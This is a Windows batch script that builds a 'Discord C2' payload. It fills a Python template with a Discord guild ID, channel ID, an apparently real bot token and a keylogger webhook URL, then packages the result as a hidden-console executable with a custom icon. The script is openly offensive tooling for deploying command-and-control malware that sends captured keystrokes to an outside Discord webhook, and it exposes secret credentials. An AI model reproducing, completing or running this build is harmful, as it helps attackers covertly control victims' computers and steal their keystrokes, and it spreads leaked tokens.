@echo off
echo ===============================================
echo Discord C2 Debug Build - Verbose Mode
echo ===============================================
echo.

REM Check if UV is installed
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Installing UV package manager...
    powershell -Command "& {Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression}"
    if %errorlevel% neq 0 (
        echo ERROR: Failed to install UV!
        pause
        exit /b 1
    )
)

echo [+] Setting up environment and dependencies...
uv sync

echo [+] Building payload with default configuration...
echo   - Name: d3
echo   - Guild ID: 1375935187250057216
echo   - Channel ID: 1375935188265209989
echo   - Bot Token: MTM37NTkzNTQ5OTU0OTU0MDM3Mg...
echo   - Webhook: https://discord.com/api/webhooks/1375937047998501057/...

echo.
echo [+] Creating configured payload...
copy discord_payload.py d3.py >nul
if %errorlevel% neq 0 (
    echo ERROR: Failed to copy template file!
    pause
    exit /b 1
)

echo [+] Showing original placeholders...
findstr /C:"{GUILD_ID}" /C:"{BOT_TOKEN}" /C:"{CHANNEL_ID}" /C:"{KEYLOGGER_WEBHOOK}" d3.py

echo.
echo [+] Replacing GUILD_ID...
powershell -Command "(Get-Content 'd3.py') -replace '\{GUILD_ID\}', '1375935187250057216' | Set-Content 'd3.py'"

echo [+] Replacing BOT_TOKEN...
powershell -Command "(Get-Content 'd3.py') -replace '\{BOT_TOKEN\}', 'MTM37NTkzNTQ5OTU0OTU0MDM3Mg.G0N_48.d3bL65IMOciVH89Ehi4oLjwWbf9yMRTKpIv41g' | Set-Content 'd3.py'"

echo [+] Replacing CHANNEL_ID...
powershell -Command "(Get-Content 'd3.py') -replace '\{CHANNEL_ID\}', '1375935188265209989' | Set-Content 'd3.py'"

echo [+] Replacing KEYLOGGER_WEBHOOK...
powershell -Command "(Get-Content 'd3.py') -replace '\{KEYLOGGER_WEBHOOK\}', 'https://discord.com/api/webhooks/1375937047998501057/uyPon8TtX2_JLYwUvP_h0fZchDvpmfhsocI1OjPrHd4l-BOolP3XwFf4ymO4uguw5boA' | Set-Content 'd3.py'"

echo.
echo [+] Verifying replacements...
findstr /C:"1375935187250057216" /C:"MTM37NTkzNTQ5OTU0OTU0MDM3Mg" /C:"1375935188265209989" d3.py

echo.
echo [+] Checking for remaining placeholders...
findstr /C:"{" d3.py
if %errorlevel% equ 0 (
    echo WARNING: Some placeholders may not have been replaced!
) else (
    echo ✅ All placeholders replaced successfully!
)

echo.
echo [+] Testing configuration syntax...
python -m py_compile d3.py
if %errorlevel% equ 0 (
    echo ✅ Python syntax is valid!
) else (
    echo ❌ Python syntax error detected!
    echo.
    echo Showing first few lines of configured file:
    powershell -Command "Get-Content 'd3.py' | Select-Object -First 40"
    pause
    exit /b 1
)

echo.
echo [+] Installing PyInstaller and building executable...
uv add pyinstaller
if not exist "dist" mkdir dist
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=d3 --distpath=dist d3.py

if %errorlevel% equ 0 (
    echo.
    echo ✅ SUCCESS! Executable created: dist\d3.exe
    
    echo.
    echo [+] Testing executable with debug mode...
    echo Running: dist\d3.exe -d
    echo (This will test the debug functionality)
    echo.
    
    REM Clean up temporary files
    del d3.py >nul 2>&1
    del d3.spec >nul 2>&1
    if exist "build" rmdir /s /q build >nul 2>&1
    
    echo Ready to test! Run: dist\d3.exe -d
) else (
    echo ❌ Build failed! Check errors above.
    echo.
    echo Keeping d3.py for debugging...
)

pause
